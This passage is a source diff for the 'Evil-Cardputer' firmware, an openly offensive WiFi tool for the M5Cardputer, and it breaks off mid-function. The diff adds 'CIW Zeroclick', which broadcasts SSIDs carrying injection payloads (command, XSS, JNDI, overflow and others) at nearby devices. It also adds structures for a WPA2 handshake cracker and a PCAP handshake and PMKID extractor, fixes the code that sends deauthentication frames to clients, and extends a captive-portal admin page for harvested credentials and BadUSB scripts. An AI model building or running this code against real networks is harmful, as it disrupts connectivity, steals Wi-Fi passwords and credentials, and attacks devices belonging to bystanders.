@@ -1,7 +1,7 @@
 /*
    Evil-Cardputer - WiFi Network Testing and Exploration Tool
 
-   Copyright (c) 2025 7h30th3r0n3
+   Copyright (c) 2026 7h30th3r0n3
 
    Permission is hereby granted, free of charge, to any person obtaining a copy
    of this software and associated documentation files (the "Software"), to deal
@@ -77,7 +77,50 @@ typedef struct {
   uint8_t  prf_data[6+6+32+32];
 } evil_wpa2_hs_t;
 
+/* Forward-declared structs for WPA2 dual-core cracker (Arduino auto-prototype needs these early) */
+#include <freertos/queue.h>
+#include <freertos/semphr.h>
+struct EvilSha1Ctx {
+  uint32_t state[5];
+  uint32_t count[2];
+  uint8_t  buf[64];
+};
 
+struct EvilHmacPre {
+  EvilSha1Ctx inner;
+  EvilSha1Ctx outer;
+};
+
+#define CRACK_QUEUE_DEPTH 8
+#define EVIL_WPA2_PASS_MAX 64
+
+struct EvilPwEntry {
+  char pw[EVIL_WPA2_PASS_MAX];
+  uint8_t len;
+};
+
+struct EvilCrackShared {
+  const evil_wpa2_hs_t *hs;
+  QueueHandle_t         queue;
+  volatile bool         found;
+  char                  found_pw[EVIL_WPA2_PASS_MAX];
+  volatile uint32_t     attempts;
+  volatile bool         abort;
+  SemaphoreHandle_t     done_sem;
+};
+
+/* Forward-declared struct for multi-handshake PCAP parser (Arduino auto-prototype needs this early) */
+#define MAX_HS_PER_PCAP 12
+struct PcapHsEntry {
+  uint8_t  bssid[6];
+  uint8_t  sta[6];
+  char     ssid[33];
+  bool     hasM1, hasM2, hasM3, hasM4;
+  bool     paired;
+  bool     hasPMKID;
+  uint64_t replay_m1;
+  uint8_t  anonce[32];
+};
 
 #include <WiFi.h>
 #include <WebServer.h>
@@ -141,12 +184,6 @@ String scanIp = "";
 #include <lwip/ip_addr.h>
 #include <ESPping.h>
 
-// Disable AsyncWebServer on ESP-IDF 5.x to avoid middleware symbol conflicts with WebServer
-#define EVIL_DISABLE_ASYNC_WEBSERVER 0
-#ifndef EVIL_DISABLE_AUDIO
-#define EVIL_DISABLE_AUDIO 0
-#endif
-
 //ssh
 #include "libssh_esp32.h"
 #include <libssh/libssh.h>
@@ -179,11 +216,7 @@ extern "C" {
 }
 
 bool ledOn = true;
-#if EVIL_DISABLE_AUDIO
-bool soundOn = false;
-#else
 bool soundOn = true;
-#endif
 bool randomOn = false;
 
 static constexpr const gpio_num_t SDCARD_CSPIN = GPIO_NUM_4;
@@ -283,6 +316,7 @@ static const char * const PROGMEM menuItems[] = {
   "ESP32C5 Serial", 
   "Aircrack", 
   "Autodiscover Abuse",
+  "CIW Zeroclick",
   "Settings",
 };
 
@@ -604,6 +638,58 @@ File fsUploadFile; // global variable for file upload
 
 String captivePortalPassword = "";
 
+// ===== CIW Zeroclick =====
+// Forward declarations
+void ciwZeroclickMenu();
+void ciwLoadPayloads(uint16_t catMask);
+void ciwStartBroadcast();
+void ciwStopBroadcast();
+void ciwBroadcastLoop();
+void ciwSelectCategories();
+void ciwViewDevices();
+void ciwViewAlerts();
+void ciwSetRotation();
+void ciwTickBroadcast();
+void ciwEnsurePayloadsFile();
+void handleCiwDashboard();
+void handleCiwPayloads();
+void handleCiwDeploy();
+void handleCiwStop();
+void handleCiwStatus();
+void handleCiwDevicesApi();
+void handleCiwAlertsApi();
+
+bool ciwBroadcasting = false;
+unsigned long ciwRotationInterval = 5000; // 5 sec default
+unsigned long ciwLastRotation = 0;
+int ciwCurrentIdx = 0;
+int ciwTotalPayloads = 0;
+uint16_t ciwSelectedCats = 0xFFFF; // bitmask for 14 categories (all on)
+
+enum CiwCat : uint8_t {
+  CIW_CMD=0, CIW_OVERFLOW, CIW_FMT, CIW_PROBE, CIW_ESC, CIW_SERIAL,
+  CIW_ENC, CIW_CHAIN, CIW_HEAP, CIW_XSS, CIW_PATH, CIW_CRLF,
+  CIW_JNDI, CIW_NOSQL, CIW_CAT_COUNT
+};
+
+static const char* const ciwCatNames[] PROGMEM = {
+  "wifi_cmd","wifi_overflow","wifi_fmt","wifi_probe","wifi_esc","wifi_serial",
+  "wifi_enc","wifi_chain","wifi_heap","wifi_xss","wifi_path","wifi_crlf",
+  "wifi_jndi","wifi_nosql"
+};
+
+struct CiwPayload { char ssid[33]; uint8_t cat; };
+struct CiwDevice  { uint8_t mac[6]; unsigned long connectTime; int payloadIdx; };
+struct CiwAlert   { uint8_t mac[6]; char ssid[33]; unsigned long durationMs; unsigned long timestamp; };
+
+static std::vector<CiwPayload> ciwPayloads;
+static CiwDevice* ciwDevices = nullptr;   // allocated on broadcast start
+static int ciwDeviceCount = 0;
+static CiwAlert* ciwAlerts = nullptr;     // allocated on broadcast start
+static int ciwAlertCount = 0;
+static int ciwAlertHead = 0;
+static wifi_event_id_t ciwWifiEventId = 0;
+
 // Probe Sniffind part
 
 #define MAX_SSIDS_Karma 100
@@ -787,7 +873,6 @@ bool kbChosen = false;
 
 
 //mp3
-#if !EVIL_DISABLE_AUDIO
 #include <AudioOutput.h>
 #include <AudioFileSourceSD.h>
 #include <AudioFileSourceID3.h>
@@ -836,50 +921,21 @@ class AudioOutputM5Speaker : public AudioOutput {
     size_t _tri_index = 0;
 };
 
-// Initialisation des objets pour la lecture audio (lazy alloc)
-static AudioFileSourceSD* file = nullptr;
-static AudioOutputM5Speaker* out = nullptr;
-static AudioGeneratorMP3* mp3 = nullptr;
+// Objets audio statiques (comme v1.4.9 — pas de new/delete)
+static AudioFileSourceSD file;
+static AudioOutputM5Speaker out(&M5.Speaker);
+static AudioGeneratorMP3 mp3;
 static AudioFileSourceID3* id3 = nullptr;
-
-static bool audioEnsureInit() {
-  if (file && out && mp3) return true;
-  file = new AudioFileSourceSD();
-  out = new AudioOutputM5Speaker(&M5.Speaker);
-  mp3 = new AudioGeneratorMP3();
-  if (!file || !out || !mp3) {
-    delete id3; id3 = nullptr;
-    delete mp3; mp3 = nullptr;
-    delete out; out = nullptr;
-    delete file; file = nullptr;
-    return false;
-  }
-  return true;
-}
-
-static bool audioIsRunning() {
-  return mp3 && mp3->isRunning();
-}
-
-static bool audioLoopOnce() {
-  return mp3 && mp3->loop();
-}
-
-static void audioStopDecode() {
-  if (mp3) mp3->stop();
-}
 
 // Fonction pour arrêter la lecture
 void stop(void) {
   if (id3 == nullptr) return;
-  if (out) out->stop();
-  if (mp3) mp3->stop();
+  out.stop();
+  mp3.stop();
   id3->close();
-  if (file) file->close();
-  delete id3; id3 = nullptr;
-  delete mp3; mp3 = nullptr;
-  delete out; out = nullptr;
-  delete file; file = nullptr;
+  file.close();
+  delete id3;
+  id3 = nullptr;
 }
 
 // Fonction pour lire un fichier MP3
@@ -887,16 +943,11 @@ void play(const char* fname) {
   if (id3 != nullptr) {
     stop();
   }
-  if (!audioEnsureInit()) return;
-  file->open(fname);
-  id3 = new AudioFileSourceID3(file);
+  file.open(fname);
+  id3 = new AudioFileSourceID3(&file);
   id3->open(fname);
-  mp3->begin(id3, out);
+  mp3.begin(id3, &out);
 }
-#else
-inline void stop(void) {}
-inline void play(const char* fname) { (void)fname; }
-#endif
 
 //mp3 end
 
@@ -1480,12 +1531,7 @@ void setupNavigatorRoutes() {
 
 void setup() {
   Serial.begin(115200);
-  auto cfg = M5.config();
-  cfg.internal_spk = false;
-  cfg.internal_mic = false;
-  M5.begin(cfg);
-  // Free classic BT memory when only BLE is used
-  esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT);
+  M5.begin();
   M5.Lcd.setRotation(1);
   M5.Display.setTextSize(1.5);
   M5.Display.setTextColor(menuTextUnFocusedColor);
@@ -1854,11 +1900,6 @@ void setup() {
     restoreConfigParameter("brightness");
     restoreConfigParameter("ledOn");
     restoreConfigParameter("soundOn");
-#if !EVIL_DISABLE_AUDIO
-    if (soundOn) {
-      M5.Speaker.begin();
-    }
-#endif
     restoreConfigParameter("volume");
     restoreConfigParameter("randomOn");
     restoreConfigParameter("selectedTheme");
@@ -1883,18 +1924,14 @@ void setup() {
       }
       if (soundOn) {
         play(randomSound.c_str());
-#if !EVIL_DISABLE_AUDIO
-        while (audioIsRunning()) {
-          if (!audioLoopOnce()) {
-            audioStopDecode();
+        while (mp3.isRunning()) {
+          if (!mp3.loop()) {
+            mp3.stop();
           } else {
             delay(1);
           }
         }
         stop();
-#else
-        delay(2000);
-#endif
       } else {
         delay(2000);
       }
@@ -1907,18 +1944,14 @@ void setup() {
       }
       if (soundOn) {
         play(selectedStartupSound.c_str());
-#if !EVIL_DISABLE_AUDIO
-        while (audioIsRunning()) {
-          if (!audioLoopOnce()) {
-            audioStopDecode();
+        while (mp3.isRunning()) {
+          if (!mp3.loop()) {
+            mp3.stop();
           } else {
             delay(1);
           }
         }
         stop();
-#else
-        delay(2000);
-#endif
       } else {
         delay(2000);
       }
@@ -1967,7 +2000,7 @@ void setup() {
   // Textes à afficher
   const char* text1 = "Evil-Cardputer";
   const char* text2 = "By 7h30th3r0n3";
-  const char* text3 = "v1.5.1 2025";
+  const char* text3 = "v1.5.2 2026";
 
   // Mesure de la largeur du texte et calcul de la position du curseur
   int text1Width = M5.Lcd.textWidth(text1);
@@ -1997,7 +2030,7 @@ void setup() {
   Serial.println(F("-------------------"));
   Serial.println(F("Evil-Cardputer"));
   Serial.println(F("By 7h30th3r0n3"));
-  Serial.println(F("v1.5.1 2025"));
+  Serial.println(F("v1.5.2 2026"));
   Serial.println(F("-------------------"));
   // Diviser randomMessage en deux lignes pour s'adapter à l'écran
   int maxCharsPerLine = screenWidth / 10;  // Estimation de 10 pixels par caractère
@@ -2090,6 +2123,7 @@ void setup() {
   // GPS sur RX=gpsRxPin, pas de TX (-1), baudrate = 9600 (par ex.)
   cardgps.begin(baudrate_gps, SERIAL_8N1, gpsRxPin, gpsTxPin);
 
+  auto cfg = M5.config();
   M5Cardputer.begin(cfg, true);
   esp_wifi_set_max_tx_power(84);
   drawMenu();
@@ -2670,7 +2704,8 @@ void executeMenuItem(int index) {
     case 82: startESP32C5SerialMenu(); break;
     case 83: evil_wpa2_passphrase_check_menu(); break;
     case 84: autodiscoverAbuse(); break;
-    case 85: showSettingsMenu(); break;
+    case 85: ciwZeroclickMenu(); break;
+    case 86: showSettingsMenu(); break;
   }
   isOperationInProgress = false;
 }
@@ -3190,7 +3225,31 @@ void checkSerialCommands() {
       Serial.println(F("list_probes - Show Probes"));
       Serial.println(F("select_probes <index> - Choose Probe <index>"));
       Serial.println(F("karma_auto - Auto Karma Attack Mode"));
+      Serial.println(F("ciw_start - Start CIW Zeroclick broadcast"));
+      Serial.println(F("ciw_stop - Stop CIW Zeroclick broadcast"));
+      Serial.println(F("ciw_status - CIW Zeroclick status"));
       Serial.println(F("-------------------"));
+    } else if (command == "ciw_start") {
+      ciwLoadPayloads(ciwSelectedCats);
+      if (ciwPayloads.empty()) {
+        Serial.println(F("CIW: No payloads loaded"));
+      } else {
+        ciwStartBroadcast();
+        Serial.println("CIW: Broadcasting " + String(ciwPayloads.size()) + " payloads");
+      }
+    } else if (command == "ciw_stop") {
+      ciwStopBroadcast();
+      Serial.println(F("CIW: Broadcast stopped"));
+    } else if (command == "ciw_status") {
+      Serial.println(F("---CIW Status---"));
+      Serial.println("Broadcasting: " + String(ciwBroadcasting ? "yes" : "no"));
+      if (ciwBroadcasting) {
+        Serial.println("Payload: " + String(ciwCurrentIdx + 1) + "/" + String((int)ciwPayloads.size()));
+        Serial.println("SSID: " + String(ciwPayloads[ciwCurrentIdx].ssid));
+      }
+      Serial.println("Devices: " + String(ciwDeviceCount));
+      Serial.println("Alerts: " + String(ciwAlertCount));
+      Serial.println(F("----------------"));
     } else {
       Serial.println(F("-------------------"));
       Serial.println("Command not recognized: " + command);
@@ -3882,7 +3941,7 @@ void createCaptivePortal() {
   // Unified admin dashboard (Basic Auth protected)
 server.on("/evil-menu", HTTP_GET, []() {
   if (!guardAdmin()) return;
-  static const char ADMIN_HTML[] PROGMEM = R"HTML(<!doctype html><html lang=en><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Admin</title><style>:root{--bg0:#0b1020;--bg1:#0f1a33;--card:rgba(255,255,255,.10);--card2:rgba(255,255,255,.14);--txt:#e9eefc;--mut:rgba(233,238,252,.72);--st:rgba(255,255,255,.14);--acc:#4c7dff;--r:16px;--sh:0 18px 60px rgba(0,0,0,.42)}@media(prefers-color-scheme:light){:root{--bg0:#f4f7ff;--bg1:#eef2ff;--card:rgba(255,255,255,.92);--card2:rgba(255,255,255,.98);--txt:#0e1730;--mut:rgba(14,23,48,.66);--st:rgba(14,23,48,.12);--sh:0 18px 60px rgba(14,23,48,.14)}}*{box-sizing:border-box}body{margin:0;min-height:100vh;display:grid;place-items:center;padding:22px;color:var(--txt);font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial;background:radial-gradient(1200px 600px at 15% 10%,rgba(76,125,255,.35),transparent 60%),radial-gradient(900px 500px at 85% 20%,rgba(40,215,198,.22),transparent 55%),linear-gradient(160deg,var(--bg0),var(--bg1))}.m{width:100%;max-width:520px;background:linear-gradient(180deg,var(--card2),var(--card));border:1px solid var(--st);border-radius:var(--r);box-shadow:var(--sh);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);overflow:hidden}.h{padding:18px 18px 12px;border-bottom:1px solid var(--st)}.t{margin:0;font-size:18px;letter-spacing:.2px}.s{margin:5px 0 0;font-size:13px;color:var(--mut)}.g{padding:12px;display:grid;gap:10px}a.i{display:flex;justify-content:space-between;align-items:center;gap:12px;padding:12px 12px;border-radius:14px;text-decoration:none;color:var(--txt);background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.10);transition:transform .10s ease,background .15s ease,border-color .15s ease,box-shadow .15s ease;outline:none}a.i:after{content:"›";font-size:20px;opacity:.7;line-height:1}a.i:hover{transform:translateY(-1px);background:rgba(255,255,255,.10);border-color:rgba(255,255,255,.18);box-shadow:0 10px 22px rgba(0,0,0,.22)}a.i:active{transform:translateY(0) scale(.995)}a.i:focus-visible{box-shadow:0 0 0 3px rgba(76,125,255,.35),0 10px 22px rgba(0,0,0,.22);border-color:rgba(76,125,255,.55)}.k{display:flex;flex-direction:column;min-width:0}.l{font-weight:650;font-size:14px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.p{font-size:12px;color:var(--mut);margin-top:2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.f{padding:10px 12px 14px;border-top:1px solid var(--st);color:var(--mut);font-size:12px;display:flex;justify-content:space-between;gap:10px;flex-wrap:wrap}@media(max-width:420px){body{padding:16px}.g{padding:10px}.p{display:none}}</style><body><div class=m><div class=h><h2 class=t>Evil Admin Console</h2><p class=s>Quick actions and monitoring</p></div><div class=g><a class=i href=/credentials><span class=k><span class=l>Credentials</span><span class=p>View and manage stored credentials</span></span></a><a class=i href=/uploadhtmlfile><span class=k><span class=l>Upload to SD</span><span class=p>Upload files to the SD card</span></span></a><a class=i href=/check-sd-file><span class=k><span class=l>Browse SD</span><span class=p>List, open, and verify SD contents</span></span></a><a class=i href=/setup-portal><span class=k><span class=l>Setup Portal</span><span class=p>Configure portal settings</span></span></a><a class=i href=/list-badusb-scripts><span class=k><span class=l>Run Script</span><span class=p>List and execute an existing script</span></span></a><a class=i href=/scan-network><span class=k><span class=l>Scan Network</span><span class=p>Fast discovery and inventory</span></span></a><a class=i href=/monitor-status><span class=k><span class=l>Monitor Status</span><span class=p>Resources, uptime, and events</span></span></a><a class=i href=/navigator><span class=k><span class=l>Navigator</span><span class=p>Live screen view and remote control</span></span></a></div><div class=f><span>WebUI v2</span><span>Responsive • Dark mode • Accessible</span></div></div></html>)HTML";
+  static const char ADMIN_HTML[] PROGMEM = R"HTML(<!doctype html><html lang=en><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Admin</title><style>:root{--bg0:#0b1020;--bg1:#0f1a33;--card:rgba(255,255,255,.10);--card2:rgba(255,255,255,.14);--txt:#e9eefc;--mut:rgba(233,238,252,.72);--st:rgba(255,255,255,.14);--acc:#4c7dff;--r:16px;--sh:0 18px 60px rgba(0,0,0,.42)}@media(prefers-color-scheme:light){:root{--bg0:#f4f7ff;--bg1:#eef2ff;--card:rgba(255,255,255,.92);--card2:rgba(255,255,255,.98);--txt:#0e1730;--mut:rgba(14,23,48,.66);--st:rgba(14,23,48,.12);--sh:0 18px 60px rgba(14,23,48,.14)}}*{box-sizing:border-box}body{margin:0;min-height:100vh;display:grid;place-items:center;padding:22px;color:var(--txt);font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial;background:radial-gradient(1200px 600px at 15% 10%,rgba(76,125,255,.35),transparent 60%),radial-gradient(900px 500px at 85% 20%,rgba(40,215,198,.22),transparent 55%),linear-gradient(160deg,var(--bg0),var(--bg1))}.m{width:100%;max-width:520px;background:linear-gradient(180deg,var(--card2),var(--card));border:1px solid var(--st);border-radius:var(--r);box-shadow:var(--sh);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);overflow:hidden}.h{padding:18px 18px 12px;border-bottom:1px solid var(--st)}.t{margin:0;font-size:18px;letter-spacing:.2px}.s{margin:5px 0 0;font-size:13px;color:var(--mut)}.g{padding:12px;display:grid;gap:10px}a.i{display:flex;justify-content:space-between;align-items:center;gap:12px;padding:12px 12px;border-radius:14px;text-decoration:none;color:var(--txt);background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.10);transition:transform .10s ease,background .15s ease,border-color .15s ease,box-shadow .15s ease;outline:none}a.i:after{content:"›";font-size:20px;opacity:.7;line-height:1}a.i:hover{transform:translateY(-1px);background:rgba(255,255,255,.10);border-color:rgba(255,255,255,.18);box-shadow:0 10px 22px rgba(0,0,0,.22)}a.i:active{transform:translateY(0) scale(.995)}a.i:focus-visible{box-shadow:0 0 0 3px rgba(76,125,255,.35),0 10px 22px rgba(0,0,0,.22);border-color:rgba(76,125,255,.55)}.k{display:flex;flex-direction:column;min-width:0}.l{font-weight:650;font-size:14px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.p{font-size:12px;color:var(--mut);margin-top:2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.f{padding:10px 12px 14px;border-top:1px solid var(--st);color:var(--mut);font-size:12px;display:flex;justify-content:space-between;gap:10px;flex-wrap:wrap}@media(max-width:420px){body{padding:16px}.g{padding:10px}.p{display:none}}</style><body><div class=m><div class=h><h2 class=t>Evil Admin Console</h2><p class=s>Quick actions and monitoring</p></div><div class=g><a class=i href=/credentials><span class=k><span class=l>Credentials</span><span class=p>View and manage stored credentials</span></span></a><a class=i href=/uploadhtmlfile><span class=k><span class=l>Upload to SD</span><span class=p>Upload files to the SD card</span></span></a><a class=i href=/check-sd-file><span class=k><span class=l>Browse SD</span><span class=p>List, open, and verify SD contents</span></span></a><a class=i href=/setup-portal><span class=k><span class=l>Setup Portal</span><span class=p>Configure portal settings</span></span></a><a class=i href=/list-badusb-scripts><span class=k><span class=l>Run Script</span><span class=p>List and execute an existing script</span></span></a><a class=i href=/scan-network><span class=k><span class=l>Scan Network</span><span class=p>Fast discovery and inventory</span></span></a><a class=i href=/monitor-status><span class=k><span class=l>Monitor Status</span><span class=p>Resources, uptime, and events</span></span></a><a class=i href=/navigator><span class=k><span class=l>Navigator</span><span class=p>Live screen view and remote control</span></span></a><a class=i href=/ciw><span class=k><span class=l>CIW Zeroclick</span><span class=p>SSID injection testing framework</span></span></a></div><div class=f><span>WebUI v2</span><span>Responsive • Dark mode • Accessible</span></div></div></html>)HTML";
   server.send_P(200, "text/html", ADMIN_HTML);
 });
 
@@ -4510,6 +4569,15 @@ server.on("/evil-menu", HTTP_GET, []() {
     Serial.println(F("-------------------"));
     servePortalFile(selectedPortalFile);
   });
+
+  // CIW Zeroclick web routes
+  server.on("/ciw", HTTP_GET, handleCiwDashboard);
+  server.on("/api/ciw/payloads", HTTP_GET, handleCiwPayloads);
+  server.on("/api/ciw/deploy", HTTP_POST, handleCiwDeploy);
+  server.on("/api/ciw/stop", HTTP_POST, handleCiwStop);
+  server.on("/api/ciw/status", HTTP_GET, handleCiwStatus);
+  server.on("/api/ciw/devices", HTTP_GET, handleCiwDevicesApi);
+  server.on("/api/ciw/alerts", HTTP_GET, handleCiwAlertsApi);
 
   setupNavigatorRoutes();
   server.begin();
@@ -7128,17 +7196,13 @@ void setStartupSound() {
             soundSelected = true;
         } else if (kp('p')) {
             String soundPath = "/evil/audio/" + sounds[currentSoundIndex];
-#if !EVIL_DISABLE_AUDIO
             play(soundPath.c_str());
-            while (audioIsRunning()) {
-                if (!audioLoopOnce()) {
-                    audioStopDecode();
+            while (mp3.isRunning()) {
+                if (!mp3.loop()) {
+                    mp3.stop();
                 }
                 delay(1);
             }
-#else
-            (void)soundPath;
-#endif
         }
 
         delay(150);  // Anti-bounce delay for key presses
@@ -7388,17 +7452,8 @@ void setStartupImage() {
 
 void toggleSound() {
     inMenu = false;
-    soundOn = !soundOn;  // Inverse l'état du son
+    soundOn = !soundOn;
 
-#if !EVIL_DISABLE_AUDIO
-    if (soundOn) {
-      M5.Speaker.begin();
-    } else {
-      M5.Speaker.end();
-    }
-#endif
-
-    // Sauvegarde le nouvel état dans le fichier de configuration
     saveConfigParameter("soundOn", soundOn);
 }
 
@@ -7930,6 +7985,8 @@ void restoreConfigParameter(String key) {
             Serial.println("StartAtBoot restored to " + String(startAtBootFlag ? "true" : "false"));
           } else if (key == "casetostartatboot") {
             intValue = stringValue.toInt();
+            // Migration: Settings shifted from 85 to 86 after CIW Zeroclick insertion
+            if (intValue == 85) intValue = 86;
             caseToStartAtBoot = intValue;
             Serial.println("CaseToStartAtBoot restored to " + String(caseToStartAtBoot));
           } else if (key == "cpu_freq") {
@@ -9558,9 +9615,9 @@ Wardriving
 
 String createPreHeader() {
   String preHeader = "WigleWifi-1.4";
-  preHeader += ",appRelease=v1.5.1"; // Remplacez [version] par la version de votre application
+  preHeader += ",appRelease=v1.5.2"; // Remplacez [version] par la version de votre application
   preHeader += ",model=Cardputer";
-  preHeader += ",release=v1.5.1"; // Remplacez [release] par la version de l'OS de l'appareil
+  preHeader += ",release=v1.5.2"; // Remplacez [release] par la version de l'OS de l'appareil
   preHeader += ",device=Evil-Cardputer"; // Remplacez [device name] par un nom de périphérique, si souhaité
   preHeader += ",display=7h30th3r0n3"; // Ajoutez les caractéristiques d'affichage, si pertinent
   preHeader += ",board=M5Cardputer";
@@ -11043,16 +11100,16 @@ void sendDeauthToClient(const uint8_t* client_mac, const uint8_t* ap_mac, int ch
   M5.Lcd.print(channel);
   M5.Lcd.print(" ");
 
-  uint8_t deauth_frame[sizeof(deauth_frame)];
-  memcpy(deauth_frame, deauth_frame, sizeof(deauth_frame));
+  uint8_t frame[26];
+  memcpy(frame, deauth_frame, 26);  // copie depuis la frame globale
 
   // Modifier les adresses MAC dans la trame de déauthentification
-  memcpy(deauth_frame + 4, ap_mac, 6);  // Adresse MAC de l'AP (destinataire)
-  memcpy(deauth_frame + 10, client_mac, 6);  // Source MAC client
-  memcpy(deauth_frame + 16, ap_mac, 6);      // BSSID (AP)
+  memcpy(frame + 4, ap_mac, 6);       // Adresse MAC de l'AP (destinataire)
+  memcpy(frame + 10, client_mac, 6);  // Source MAC client
+  memcpy(frame + 16, ap_mac, 6);      // BSSID (AP)
 
   // Envoyer la trame modifiée
-  esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
+  esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
   /*
     //Debugging output of packet contents
     Serial.println(F("Deauthentication Frame Sent:"));
@@ -11098,7 +11155,14 @@ void sendBroadcastDeauths() {
               }
             }
           }
-          vTaskDelay(deauthWaitingTime);
+          // Attente non-bloquante pour capturer EAPOL
+          {
+            unsigned long waitStart = millis();
+            while (millis() - waitStart < deauthWaitingTime) {
+              esp_task_wdt_reset();
+              vTaskDelay(pdMS_TO_TICKS(50));
+            }
+          }
           M5.Lcd.setCursor(M5.Display.width() / 2 - 80, M5.Display.height() / 2 + 28);
           M5.Lcd.printf("                                ");
         } else {
@@ -11461,7 +11525,7 @@ void deauthClients() {
       lastKeyPressTime = currentPressTime;
     }
 
-    if (kp(KEY_ENTER) || kp(KEY_BACKSPACE) && (currentPressTime - lastKeyPressTime > debounceDelay)) {
+    if ((kp(KEY_ENTER) || kp(KEY_BACKSPACE)) && (currentPressTime - lastKeyPressTime > debounceDelay)) {
       esp_wifi_set_promiscuous(false);
       esp_wifi_set_promiscuous_rx_cb(NULL);
       break;
@@ -11567,8 +11631,182 @@ String makeFullPath(const String& n){ return n.startsWith("/") ? n : String(HAND
 
 
 /* ======================================================================================================================
-   handlePcapSliding  —  détection Beacon + (4-Way || PMKID) — version “robuste” 08-08-2025
-   ==================================================================================================================== */
+   Multi-handshake PCAP parser — groups EAPOL by BSSID, validates M1+M2 pairs per AP
+   (PcapHsEntry & MAX_HS_PER_PCAP are forward-declared near top of file)
+   ====================================================================================================================== */
+
+/* Find or create entry for a BSSID */
+int findOrAddBssid(PcapHsEntry *entries, int &count, const uint8_t bssid[6]) {
+  for (int i = 0; i < count; i++) {
+    if (memcmp(entries[i].bssid, bssid, 6) == 0) return i;
+  }
+  if (count >= MAX_HS_PER_PCAP) return -1;
+  int idx = count++;
+  memset(&entries[idx], 0, sizeof(PcapHsEntry));
+  memcpy(entries[idx].bssid, bssid, 6);
+  return idx;
+}
+
+/* Core parser: extract all handshakes grouped by BSSID from a PCAP */
+int parsePcapMultiHS(const String& path, PcapHsEntry *entries, int maxEntries, bool &hasBeacon) {
+  File f = SD.open(path);
+  if (!f) return 0;
+
+  hasBeacon = false;
+  int count = 0;
+
+  uint8_t ghdr[24];
+  if (f.read(ghdr, 24) != 24) { f.close(); return 0; }
+  if (!(ghdr[0]==0xD4 && ghdr[1]==0xC3 && ghdr[2]==0xB2 && ghdr[3]==0xA1)) { f.close(); return 0; }
+
+  const size_t MAX_REC = 2048;
+  uint8_t *rec = (uint8_t*)malloc(MAX_REC);
+  if (!rec) { f.close(); return 0; }
+
+  while (f.available() >= 16) {
+    uint8_t rh[16];
+    if (f.read(rh, 16) != 16) break;
+
+    uint32_t incl_len = (uint32_t)rh[8] | ((uint32_t)rh[9]<<8) |
+                        ((uint32_t)rh[10]<<16) | ((uint32_t)rh[11]<<24);
+
+    if (incl_len == 0 || incl_len > MAX_REC) {
+      if (incl_len > 0 && incl_len <= 65535) { f.seek(f.position() + incl_len); continue; }
+      break;
+    }
+    if (f.read(rec, incl_len) != (int)incl_len) break;
+
+    /* ---- Beacon: extract SSID per BSSID ---- */
+    if (incl_len >= 36) {
+      uint16_t fc = (uint16_t)rec[0] | ((uint16_t)rec[1] << 8);
+      uint8_t ftype = (fc & 0x000C) >> 2;
+      uint8_t fsub  = (fc & 0x00F0) >> 4;
+      if (ftype == 0x00 && fsub == 0x08) {
+        hasBeacon = true;
+        const uint8_t *bssid = rec + 16;
+        int idx = findOrAddBssid(entries, count, bssid);
+        if (idx >= 0 && entries[idx].ssid[0] == '\0') {
+          /* Parse SSID IE */
+          uint32_t off = 24 + 12; // MAC header + fixed params
+          while (off + 2 <= incl_len) {
+            uint8_t id = rec[off], il = rec[off+1];
+            off += 2;
+            if (off + il > incl_len) break;
+            if (id == 0x00 && il > 0 && il <= 32) {
+              memcpy(entries[idx].ssid, rec + off, il);
+              entries[idx].ssid[il] = '\0';
+              break;
+            }
+            off += il;
+          }
+        }
+      }
+    }
+
+    /* ---- Find SNAP+EAPOL ---- */
+    int snapOff = -1;
+    for (uint32_t i = 0; i + 8 <= incl_len; i++) {
+      if (rec[i]==0xAA && rec[i+1]==0xAA && rec[i+2]==0x03 &&
+          rec[i+3]==0x00 && rec[i+4]==0x00 && rec[i+5]==0x00 &&
+          rec[i+6]==0x88 && rec[i+7]==0x8E) {
+        snapOff = (int)i;
+        break;
+      }
+    }
+    if (snapOff < 0) continue;
+
+    const uint8_t *eapol = rec + snapOff + 8;
+    uint32_t eapolAvail = incl_len - (snapOff + 8);
+    if (eapolAvail < 99) continue;
+    if (eapol[1] != 0x03) continue;
+
+    const uint8_t *key = eapol + 4;
+    uint16_t ki = ((uint16_t)key[1] << 8) | key[2];
+    bool ack     = ki & KI_ACK;
+    bool mic     = ki & KI_MIC;
+    bool install = ki & KI_INSTALL;
+    bool secure  = ki & KI_SECURE;
+
+    const uint8_t *addr1 = rec + 4;
+    const uint8_t *addr2 = rec + 10;
+
+    uint64_t replay = 0;
+    for (int i = 0; i < 8; i++) replay = (replay << 8) | key[5 + i];
+
+    /* ---- M1: AP→STA (ack, no mic) ---- */
+    if (ack && !mic) {
+      const uint8_t *apMac = addr2;  // source = AP
+      int idx = findOrAddBssid(entries, count, apMac);
+      if (idx >= 0) {
+        entries[idx].hasM1 = true;
+        entries[idx].replay_m1 = replay;
+        memcpy(entries[idx].sta, addr1, 6);
+        memcpy(entries[idx].anonce, key + 13, 32);
+
+        /* PMKID check */
+        if (!entries[idx].hasPMKID && eapolAvail > 99) {
+          uint16_t kdLen = ((uint16_t)key[93] << 8) | key[94];
+          if (kdLen >= 20 && (snapOff + 8 + 4 + 95 + kdLen) <= incl_len) {
+            const uint8_t *kd = key + 95;
+            for (uint32_t k = 0; k + 6 <= kdLen; k++) {
+              if (kd[k]==0xDD && kd[k+2]==0x00 && kd[k+3]==0x0F &&
+                  kd[k+4]==0xAC && kd[k+5]==0x04) {
+                entries[idx].hasPMKID = true;
+                break;
+              }
+            }
+          }
+        }
+      }
+    }
+
+    /* ---- M2: STA→AP (mic, no ack, no install, no secure) ---- */
+    if (!ack && mic && !install && !secure) {
+      const uint8_t *apMac = addr1;  // destination = AP
+      int idx = findOrAddBssid(entries, count, apMac);
+      if (idx >= 0) {
+        entries[idx].hasM2 = true;
